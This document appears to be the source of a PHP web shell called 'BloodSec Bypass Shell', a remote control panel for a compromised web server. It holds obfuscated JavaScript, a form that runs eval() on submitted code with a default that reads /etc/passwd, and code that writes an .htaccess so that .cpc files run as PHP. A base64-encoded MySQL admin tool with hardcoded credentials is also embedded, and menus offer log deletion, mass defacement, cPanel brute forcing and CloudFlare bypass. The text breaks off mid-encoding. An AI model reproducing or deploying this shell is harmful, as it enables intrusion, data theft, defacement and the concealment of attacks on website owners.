eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6d%66%35%65%38%64%63%36%39%30%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%31%37%30%36%38%31%34%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%31%31%34%31%35%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%34%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6d%66%35%65%38%64%63%36%39%30%28%27') + '%3e%77%65%77%60%62%33%73%49%60%67%64%6e%6c%1b%4f%63%69%6b%61%1b%73%2b%29%2b%34%3e%2c%70%62%78%6b%68%3d11706814%36%37%30%37%38%33%39' + unescape('%27%29%29%3b'));
// -->
</script>
<noscript><i>Javascript requi#428bca</i></noscript>

</html>


<script type="text/javascript">
function tukar(lama,baru){
	document.getElementById(lama).style.display = 'none';
	document.getElementById(baru).style.display = 'block';
}
</script>
<style type="text/css">
body{			
				margin: 0px;
				font-family:Orbitron, sans-serif;
}
.iNew-SubHome{
		
				background-color: #292929;
				width:25%;
				margin-top:20px;
}.mysql{
	background-color: #393939;
}

border-bottom:1px solid #428bca;
}
*{
	font-size:13px;
	font-family:Orbitron, sans-serif;
	color:#00B800;
}
#menu{
	
	margin:8px 2px 4px 2px;

}
#menu:hover {

}

.tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #333333;
}
.main {
	
	width:100%;
}
.gaya {
	color: #428bca;
}
.inputz{
	
	background:#111111;
	border:0;
	padding:2px;
	border-bottom:1px solid #222222;
	border-top:1px solid #222222;
}
.inputzbut{
	background:#111111;
	color:#428bca;
	margin:0 4px;
	border:1px solid #444444;

}
.inputz:hover, .inputzbut:hover{
	border-bottom:1px solid #428bca;
	border-top:1px solid #428bca;
}
.output {
	margin:auto;
	border:1px solid #428bca;
	width:100%;
	height:400px;
	background:#000000;
	padding:0 2px;
}
.cmdbox{
	width:100%;
}
.head_info{
	padding: 0 4px;
}
.jaya{ font-family: ;}

.b374k{
	font-size:30px;
	padding:0;
	color:#444444;
}

.b374k_tbl{
	text-align:center;
	margin:0 4px 0 0;
	padding:0 4px 0 0;
	border-right:1px solid #333333;
}
.phpinfo table{
	width:100%;
	padding:0 0 0 0;
}
.phpinfo td{
	background:#111111;
	color:#cccccc;
padding:6px 8px;;
}
.phpinfo th, th{
	background:#191919;
	border-bottom:1px solid #333333;
font-weight:normal;
}
.phpinfo h2, .phpinfo h2 a{
	text-align:center;
	font-size:16px;
	padding:0;
	margin:30px 0 0 0;
	background:#222222;
	padding:4px 0;
}
.explore{
width:100%;
}
.explore a {
text-decoration:none;
}
.explore td{
border-bottom:1px solid #333333;
padding:0 8px;
line-height:24px;
}
.explore th{
padding:3px 8px;
font-weight:normal;
}
.explore th:hover , .phpinfo th:hover{
border-bottom:1px solid #428bca;
}
.explore tr:hover{
background:#111111;
}
.viewfile{
background:#EDECEB;
color:#000000;
margin:4px 2px;
padding:8px;
}
.sembunyi{
display:none;
padding:0;margin:0;
}
h1{
			font-size:50px;
			color:#81ADCF;
			font-family: Orbitron,sans-serif;
			top-margin:10px;
			}

.btn{

  width: 112px;
  height: 22px;
  font-size: 11px;
  font-family:  Orbitron, sans-serif;
  border-radius:3px;
  border-color:#000;
  margin:0.1px;
 background: #2c3e50;
	background: -webkit-linear-gradient(#2c3e50, #2c3e50);
	background: -moz-linear-gradient(#2c3e50, #2c3e50);
	background: -o-linear-gradient(#2c3e50, #2c3e50);
	background: -ms-linear-gradient(#333, #2c3e50);
	background: linear-gradient(#2c3e50, #2c3e50);
	-webkit-box-sizing: content-box;
	-moz-box-sizing: content-box;
	-o-box-sizing: content-box;
	-ms-box-sizing: content-box;
}
.btn:hover {
 background: #292929;
	background: -webkit-linear-gradient(#393939, #292929);	
	background: -moz-linear-gradient(#393939, #292929);	
	background: -o-linear-gradient(#393939, #292929);	
	background: -ms-linear-gradient(#393939, #292929);	
	background: linear-gradient(#393939, #292929);
	color: #428bca ;
	outline: none;
}
.btn.title {
  font-family: Abel;
  font-size: 10px;
  color: #fff;
  line-height: 30px;
  float: left;
  padding: 0 10px;
  text-shadow: -1px -1px 1px rgba(0, 0, 0, 0.5);
  box-shadow: -1px 0 0 rgba(255, 255, 255, 0.1);
  border-left: 1px solid rgba(0, 0, 0, 0.3);
  
}
</style>

<!-- Bootstrap core CSS -->
    <link href="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/css/bootstrap.min.css" media="all" type="text/css" rel="stylesheet">
    <link href="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/css/cybernetics.css" media="all" type="text/css" rel="stylesheet">

    <!-- jquery -->
    <script src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/js/jquery-1.11.1.min.js"></script>
	<script src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/js/bootstrap.min.js"></script>


      <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
      <!--[if lt IE 9]>
      <script src="http://www.heavygear.com/js/html5shiv-3.7.0.js"></script>
      <script src="http://www.heavygear.com/js/respond-1.4.2.js"></script>
      <![endif]-->

</head>

<body onLoad="document.getElementById('cmd').focus();">





<nav class="navbar navbar-default navbar-static-top" role="navigation">
    <div class="container-fluid">
        <div class="row row-plain lb-ticker-container">
            <img src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/img/header-blue-bar2.png" class="img-responsive col-xs-12 no-padding" id="header-bg"/>
            <div class="col-xs-10 marquee  lb-ticker">
                <div class="stat text-left">
                                            <div class="fadeText">
                              
                                                            <div class="col-xs-3 user">
                                    <a href="5389.html">
                                    <div class="callsign">Current User</div>
                                    <div class="score"><?php if ('' != $id) {
    echo $buff = '' . $id . '';
} ?></div>
                                    </a>
                                </div>
                                                            <div class="col-xs-3 user">
                                    <a href="8304.html">
                                    <div class="callsign">PHP Version</div>
                                    <div class="score"><?php echo $buff = '' . phpversion() . ' on ' . php_sapi_name() . ''; ?></div>
                                    </a>
                                </div>
                                                    </div>
                                            <div class="fadeText">
                                                            <div class="col-xs-3 user">
                                    <a href="8356.html">
                                    <div class="callsign">Server IP</div>
                                    <div class="score"><?php echo $buff = '' . $server_ip . ''; ?></div>
                                    </a>
                                </div>
                                                            <div class="col-xs-3 user">
                                    <a href="5227.html">
                                    <div class="callsign">Client IP </div>
                                    <div class="score"><?php echo $buff = '' . $my_ip . ''; ?></div>
                                    </a>
                                </div>
                                                            <div class="col-xs-3 user">
                                    <a href="7590.html">
                                    <div class="callsign">Admin</div>
                                    <div class="score"><?php echo $buff = '' . $admin_id . ''; ?></div>
                                    </a>
                                </div>
                                                            <div class="col-xs-3 user">
                                    <a href="6952.html">
                                    <div class="callsign">Free Disk</div>
                                    <div class="score"><?php echo $buff = ' ' . '' . convertByte(disk_free_space('/')) . ' / ' . convertByte(disk_total_space('/')) . ''; ?></div>
                                    </a>
                                </div>
                                                    </div>
                                            <div class="fadeText">
                                                            <div class="col-xs-3 user">
                                    <a href="2575.html">
                                    <div class="callsign">SafeMode</div>
                                    <div class="score"><?php if ($safemode) {
    echo $buff = 'ON';
} else {
    echo $buff = 'OFF';
} ?></div>
                                    </a>
                                </div>
                                                            <div class="col-xs-3 user">
                                    <a href="7217.html">
                                    <div class="callsign">Disabled Functions</div>
                                    <div class="score"><?php echo $buff = '' . showdisablefunctions() . ''; ?></div>
                                    </a>
                                </div>
                                                            
                                                    </div>
                                    </div>
            </div>
            <script>
                  var spans = $('div.fadeText');

                  function loop(span) {
                      span.fadeIn(1000).delay(3000).fadeOut(1000, function() {
                          loop( span.next().length ? span.next() : spans.first() );
                      });
                  }

                  loop( spans.first() );
            </script>
            <div class="col-xs-2 col-xs-offset-10 lb-title">
				<h1 style="font-size:20px">Shell Version:4z</h1>
				
            </div>
        </div>
      <div class="row row-plain navbar-top">
        <div class="col-sm-1 col-md-1 col-md-offset-1">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="?<?php echo 'y=' . $pwd; ?>"><img alt="Heavy Gear Assault"  src="http://oi62.tinypic.com/vifocj.jpg" width="80x" height="63px" /></a>
            </div>
        </div>
        <div class="col-sm-8 col-sm-offset-1 col-md-offset-0">
            <div class="navbar-collapse collapse">
                <ul class="nav navbar-nav">

                     <li><a href="?<?php echo 'y=' . $pwd; ?>"><img src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/img/hex-bullet.png" class="hex-bullet"/>Home</a></li>

                    <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"><img src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/img/hex-bullet.png" class="hex-bullet"/>System Tools<span class="caret"></span></a>
                        <ul class="dropdown-menu" role="menu">
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=shell">Shell</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=sql">MySql</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=dump">Database Dump</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=phpinfo">Php Info</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=netsploit">Net Sploit</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=apa">Upload</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=mail">Email</a></li>
							<li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=cgi4e">CGI Telnet 2012</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=domain">Domain</a></li> 
							<li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=deltlogss">Delete Logs</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=whmcs">WHMCS Decoder</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=zone">Zone-H</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=mass">Mass Deface</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=brute">Cpanel BruteForce</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=bypass-cf">Bypass CloudFlare</a></li>
                        </ul>
                    </li>
			
					  <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=about"><img src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/img/hex-bullet.png" class="hex-bullet"/>About</a></li>
			
					 <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"><img src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/img/hex-bullet.png" class="hex-bullet"/>System Options<span class="caret"></span></a>
                        <ul class="dropdown-menu" role="menu">
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=sqli-scanner">SQL Scan</a></li>
							<li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=hashid">Hash Identify</a></li>
							<li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=adfin">Admin Finder</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=port-sc">Port Scan</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=python">Python</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=symlink">Symlink</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=config">Config</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=bypass">Bypass</a></li>
							<li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=string">Script Encode</a></li>
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=whois">Website Whois</a></li>
                        </ul>
                    </li>
                    
                    <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"><img src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/img/hex-bullet.png" class="hex-bullet"/>Account <span class="caret"></span></a>
                        <ul class="dropdown-menu" role="menu">
                            <li><a href="?<?php echo 'y=' . $pwd; ?>&amp;x=logout">Logout</a></li>
                        </ul>
                    </li>

                    
                </ul>
            </div>
            <!--/.nav-collapse -->
            </div>

        </div>
    </div>
</nav>

<!------->
<center>
<div class="main">
<!-- head info start here -->
<div class="head_info" ><center>
<h1>BloodSec</span> Bypass Shell</h1>

<?php
echo $buff = "Kernel Version : <b><span style='font-size:10px'>" . $system . '</b><br>';
echo $buff = "Software : <b><span style='font-size:10px'>" . $software . '</b> <br>';
?><span ><span style="color:#2c3e50;">__________________________________________________________________</span>

<?php
echo $buff = "<center><font color=FF0000 ><b><span style='font-size:10px'>" . $letters . "&nbsp;&gt;&nbsp;<span style='font-size:10px'>" . $pwdurl . '</b></font>';
?><html>
<head>
</head>
<body>


</html>

</span></a><html>
<head>
</head>
<body>



</html>

</div>
<!-- head info end here -->
<!-- menu start -->
<center><div id="menu">

<audio autoplay> <source src="http://www.soundrangers.com/demos/interface/glossy/glossy_click_10.mp3" type="audio/mpeg"></audio>

</div></center>
<!-- menu end -->

<?php
@ini_set('display_errors', 0);
if (isset($_GET['x']) && ('php' == $_GET['x'])) { ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post">
<table class="cmdbox">
<tr><td>
<textarea class="output" name="cmd" id="cmd">
<?php
    if (isset($_POST['submitcmd'])) {
        echo eval(magicboom($_POST['cmd']));
    } else {
        echo "echo file_get_contents('/etc/passwd');";
    }
?>
</textarea>
<tr><td><input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /></td></tr></form>
</table>
</form>

<?php
} elseif (isset($_GET['x']) && ('sql' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=sql" method="post">
<?php
    echo '<center/><br/><b><font color=#428bca>+--==[ Mysql Interface ]==--+</font></b><br><br>';
    mkdir('mysql', 0755);
    chdir('mysql');
    $akses = '.htaccess';
    $buka_lah = "$akses";
    $buka = fopen($buka_lah, 'w') or die('Error cuyy!');
    $metin = 'Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-php .cpc
';
    fwrite($buka, $metin);
    fclose($buka);
    $sqlshell = 'PD8NCiRQQVNTV09SRCA9ICJkNHJrajFuIjsNCiRVU0VSTkFNRSA9ICJibG9vZHNlY3VyaXR5IjsNCmlmICggZnVuY3Rpb25fZXhpc3RzKCdpbmlfZ2V0JykgKSB7DQoJJG9ub2ZmID0gaW5pX2dldCgncmVnaXN0ZXJfZ2xvYmFscycpOw0KfSBlbHNlIHsNCgkkb25vZmYgPSBnZXRfY2ZnX3ZhcigncmVnaXN0ZXJfZ2xvYmFscycpOw0KfQ0KaWYgKCRvbm9mZiAhPSAxKSB7DQoJQGV4dHJhY3QoJEhUVFBfU0VSVkVSX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfQ09PS0lFX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfUE9TVF9GSUxFUywgRVhUUl9TS0lQKTsNCglAZXh0cmFjdCgkSFRUUF9QT1NUX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfR0VUX1ZBUlMsIEVYVFJfU0tJUCk7DQoJQGV4dHJhY3QoJEhUVFBfRU5WX1ZBUlMsIEVYVFJfU0tJUCk7DQp9DQoNCmZ1bmN0aW9uIGxvZ29uKCkgew0KCWdsb2JhbCAkUEhQX1NFTEY7DQoJc2V0Y29va2llKCAibXlzcWxfd2ViX2FkbWluX3VzZXJuYW1lIiApOw0KCXNldGNvb2tpZSggIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIgKTsNCglzZXRjb29raWUoICJteXNxbF93ZWJfYWRtaW5faG9zdG5hbWUiICk7DQoJZWNobyAiPHRhYmxlIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCU+PHRyPjx0ZD48Y2VudGVyPlxuIjsNCgllY2hvICI8dGFibGUgY2VsbHBhZGRpbmc9Mj48dHI+PHRkPjxjZW50ZXI+XG4iOw0KCWVjaG8gIjx0YWJsZSBjZWxscGFkZGluZz0yMD48dHI+PHRkPjxjZW50ZXI+XG4iOw0KCWVjaG8gIjxoMT5NeVNRTCBJbnRlcmZhY2UgQnkgRDRya2oxbjwvaDE+XG4iOw0KCWVjaG8gIjxmb3JtIGFjdGlvbj0nJFBIUF9TRUxGJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0aW9uIHZhbHVlPWJHOW5iMjVmYzNWaWJXbDA+XG4iOw0KCWVjaG8gIjx0YWJsZSBjZWxscGFkZGluZz01IGNlbGxzcGFjaW5nPTE+XG4iOw0KCWVjaG8gIjx0cj48dGQgY2xhc3M9XCJuZXdcIj5Ib3N0bmFtZSA8L3RkPjx0ZD4gPGlucHV0IHR5cGU9dGV4dCBuYW1lPWhvc3RuYW1lIHZhbHVlPSdsb2NhbGhvc3QnPjwvdGQ+PC90cj5cbiI7DQoJZWNobyAiPHRyPjx0ZCBjbGFzcz1cIm5ld1wiPlVzZXJuYW1lIDwvdGQ+PHRkPiA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9dXNlcm5hbWU+PC90ZD48L3RyPlxuIjsNCgllY2hvICI8dHI+PHRkIGNsYXNzPVwibmV3XCI+UGFzc3dvcmQgPC90ZD48dGQ+IDxpbnB1dCB0eXBlPXBhc3N3b3JkIG5hbWU9cGFzc3dvcmQ+PC90ZD48L3RyPlxuIjsNCgllY2hvICI8L3RhYmxlPjxwPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0VudGVyJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9cmVzZXQgdmFsdWU9J0NsZWFyJz48YnI+XG4iOw0KCWVjaG8gIjwvZm9ybT5cbiI7DQoJZWNobyAiPC9jZW50ZXI+PC90ZD48L3RyPjwvdGFibGU+XG4iOw0KCWVjaG8gIjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPlxuIjsNCgllY2hvICI8cD48aHIgd2lkdGg9MzAwPlxuIjsNCgllY2hvICI8L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT5cbiI7DQp9DQoNCmZ1bmN0aW9uIGxvZ29uX3N1Ym1pdCgpIHsNCglnbG9iYWwgJHVzZXJuYW1lLCAkcGFzc3dvcmQsICRob3N0bmFtZSAsJFBIUF9TRUxGOw0KCWlmKCRob3N0bmFtZSA9PScnKQ0KCQkkaG9zdG5hbWUgPSAnbG9jYWxob3N0JzsNCglzZXRjb29raWUoICJteXNxbF93ZWJfYWRtaW5fdXNlcm5hbWUiLCAkdXNlcm5hbWUgKTsNCglzZXRjb29raWUoICJteXNxbF93ZWJfYWRtaW5fcGFzc3dvcmQiLCAkcGFzc3dvcmQgKTsNCglzZXRjb29raWUoICJteXNxbF93ZWJfYWRtaW5faG9zdG5hbWUiLCAkaG9zdG5hbWUgKTsNCgllY2hvICI8TUVUQSBIVFRQLUVRVUlWPVJlZnJlc2ggQ09OVEVOVD0nMDsgVVJMPSRQSFBfU0VMRj9hY3Rpb249YkdsemRFUkNjdz09Jz4iOw0KfQ0KDQpmdW5jdGlvbiBlY2hvUXVlcnlSZXN1bHQoKSB7DQoJZ2xvYmFsICRxdWVyeVN0ciwgJGVyck1zZzsNCglpZiggJGVyck1zZyA9PSAiIiApICRlcnJNc2cgPSAiU3VjY2VzcyI7DQoJaWYoICRxdWVyeVN0ciAhPSAiIiApIHsNCgkJZWNobyAiPHRhYmxlIGNlbGxwYWRkaW5nPTU+XG4iOw0KCQllY2hvICI8dHI+PHRkPlF1ZXJ5PC90ZD48dGQ+JHF1ZXJ5U3RyPC90ZD48L3RyPlxuIjsNCgkJZWNobyAiPHRyPjx0ZD5SZXN1bHQ8L3RkPjx0ZD4kZXJyTXNnPC90ZD48L3RyPlxuIjsNCgkJZWNobyAiPC90YWJsZT48cD5cbiI7DQoJfQ0KfQ0KDQpmdW5jdGlvbiBsaXN0RGF0YWJhc2VzKCkgew0KCWdsb2JhbCAkbXlzcWxIYW5kbGUsICRQSFBfU0VMRjsNCgllY2hvICI8aDE+RGF0YWJhc2VzIExpc3Q8L2gxPlxuIjsNCgllY2hvICI8Zm9ybSBhY3Rpb249JyRQSFBfU0VMRic+XG4iOw0KCWVjaG8gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdGlvbiB2YWx1ZT1jcmVhdGVEQj5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9dGV4dCBuYW1lPWRibmFtZT5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdDcmVhdGUgRGF0YWJhc2UnPlxuIjsNCgllY2hvICI8L2Zvcm0+XG4iOw0KCWVjaG8gIjxocj5cbiI7DQoJZWNobyAiPHRhYmxlIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGRpbmc9NT5cbiI7DQoJJHBEQiA9IG15c3FsX2xpc3RfZGJzKCAkbXlzcWxIYW5kbGUgKTsNCgkkbnVtID0gbXlzcWxfbnVtX3Jvd3MoICRwREIgKTsNCglmb3IoICRpID0gMDsgJGkgPCAkbnVtOyAkaSsrICkgew0KCQkkZGJuYW1lID0gbXlzcWxfZGJuYW1lKCAkcERCLCAkaSApOw0KCQllY2hvICI8dHI+XG4iOw0KCQllY2hvICI8dGQ+JGRibmFtZTwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1saXN0VGFibGVzJmRibmFtZT0kZGJuYW1lJz5UYWJsZXM8L2E+PC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPWRyb3BEQiZkYm5hbWU9JGRibmFtZScgb25DbGljaz1cInJldHVybiBjb25maXJtKCdEcm9wIERhdGFiYXNlIFwnJGRibmFtZVwnPycpXCI+RHJvcDwvYT48L3RkPlxuIjsNCgkJZWNobyAiPHRkPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHVtcERCJmRibmFtZT0kZGJuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0R1bXAgRGF0YWJhc2UgXCckZGJuYW1lXCc/JylcIj5EdW1wPC9hPjwvdGQ+XG4iOw0KCQllY2hvICI8L3RyPlxuIjsNCgl9DQoJZWNobyAiPC90YWJsZT5cbiI7DQp9DQoNCmZ1bmN0aW9uIGNyZWF0ZURhdGFiYXNlKCkgew0KCWdsb2JhbCAkbXlzcWxIYW5kbGUsICRkYm5hbWUsICRQSFBfU0VMRjsNCglteXNxbF9jcmVhdGVfZGIoICRkYm5hbWUsICRteXNxbEhhbmRsZSApOw0KCWxpc3REYXRhYmFzZXMoKTsNCn0NCg0KZnVuY3Rpb24gZHJvcERhdGFiYXNlKCkgew0KCWdsb2JhbCAkbXlzcWxIYW5kbGUsICRkYm5hbWUsICRQSFBfU0VMRjsNCglteXNxbF9kcm9wX2RiKCAkZGJuYW1lLCAkbXlzcWxIYW5kbGUgKTsNCglsaXN0RGF0YWJhc2VzKCk7DQp9DQoNCmZ1bmN0aW9uIGxpc3RUYWJsZXMoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJFBIUF9TRUxGOw0KCWVjaG8gIjxoMT5UYWJsZXMgTGlzdDwvaDE+XG4iOw0KCWVjaG8gIjxwIGNsYXNzPWxvY2F0aW9uPiRkYm5hbWU8L3A+XG4iOw0KCWVjaG9RdWVyeVJlc3VsdCgpOw0KCWVjaG8gIjxmb3JtIGFjdGlvbj0nJFBIUF9TRUxGJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0aW9uIHZhbHVlPWNyZWF0ZVRhYmxlPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kYm5hbWUgdmFsdWU9JGRibmFtZT5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9dGV4dCBuYW1lPXRhYmxlbmFtZT5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdDcmVhdGUgVGFibGUnPlxuIjsNCgllY2hvICI8L2Zvcm0+XG4iOw0KCWVjaG8gIjxmb3JtIGFjdGlvbj0nJFBIUF9TRUxGJz5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YWN0aW9uIHZhbHVlPXF1ZXJ5PlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kYm5hbWUgdmFsdWU9JGRibmFtZT5cbiI7DQoJZWNobyAiPGlucHV0IHR5cGU9dGV4dCBzaXplPTEyMCBuYW1lPXF1ZXJ5U3RyPlxuIjsNCgllY2hvICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J1F1ZXJ5Jz5cbiI7DQoJZWNobyAiPC9mb3JtPlxuIjsNCgllY2hvICI8aHI+XG4iOw0KCSRwVGFibGUgPSBteXNxbF9saXN0X3RhYmxlcyggJGRibmFtZSApOw0KCWlmKCAkcFRhYmxlID09IDAgKSB7DQoJCSRtc2cgID0gbXlzcWxfZXJyb3IoKTsNCgkJZWNobyAiPGgzPkVycm9yIDogJG1zZzwvaDM+PHA+XG4iOw0KCQlyZXR1cm47DQoJfQ0KCSRudW0gPSBteXNxbF9udW1fcm93cyggJHBUYWJsZSApOw0KCWVjaG8gIjx0YWJsZSBjZWxsc3BhY2luZz0xIGNlbGxwYWRkaW5nPTU+XG4iOw0KCWZvciggJGkgPSAwOyAkaSA8ICRudW07ICRpKysgKSB7DQoJCSR0YWJsZW5hbWUgPSBteXNxbF90YWJsZW5hbWUoICRwVGFibGUsICRpICk7DQoJCWVjaG8gIjx0cj5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIiR0YWJsZW5hbWVcbiI7DQoJCWVjaG8gIjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+XG4iOw0KCQllY2hvICI8YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPXZpZXdTY2hlbWEmZGJuYW1lPSRkYm5hbWUmdGFibGVuYW1lPSR0YWJsZW5hbWUnPlNjaGVtYTwvYT5cbiI7DQoJCWVjaG8gIjwvdGQ+XG4iOw0KCQllY2hvICI8dGQ+7PgXYiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZG1sbGQwUmhkR0U9JmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJz5EYXRhPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHJvcFRhYmxlJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0Ryb3AgVGFibGUgXCckdGFibGVuYW1lXCc/JylcIj5Ecm9wPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjx0ZD5cbiI7DQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249ZHVtcFRhYmxlJmRibmFtZT0kZGJuYW1lJnRhYmxlbmFtZT0kdGFibGVuYW1lJyBvbkNsaWNrPVwicmV0dXJuIGNvbmZpcm0oJ0R1bXAgVGFibGUgXCckdGFibGVuYW1lXCc/JylcIj5EdW1wPC9hPlxuIjsNCgkJZWNobyAiPC90ZD5cbiI7DQoJCWVjaG8gIjwvdHI+XG4iOw0KCX0NCgllY2hvICI8L3RhYmxlPiI7DQp9DQoNCmZ1bmN0aW9uIGNyZWF0ZVRhYmxlKCkgew0KDQoJZ2xvYmFsICRteXNxbEhhbmRsZSwgJGRibmFtZSwgJHRhYmxlbmFtZSwgJFBIUF9TRUxGLCAkcXVlcnlTdHIsICRlcnJNc2c7DQoJJHF1ZXJ5U3RyID0gIkNSRUFURSBUQUJMRSAkdGFibGVuYW1lICggbm8gSU5UICkiOw0KCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJbXlzcWxfcXVlcnkoICRxdWVyeVN0ciwgJG15c3FsSGFuZGxlICk7DQoJJGVyck1zZyA9IG15c3FsX2Vycm9yKCk7DQoJbGlzdFRhYmxlcygpOw0KfQ0KDQpmdW5jdGlvbiBkcm9wVGFibGUoKSB7DQoJZ2xvYmFsICRteXNxbEhhbmRsZSwg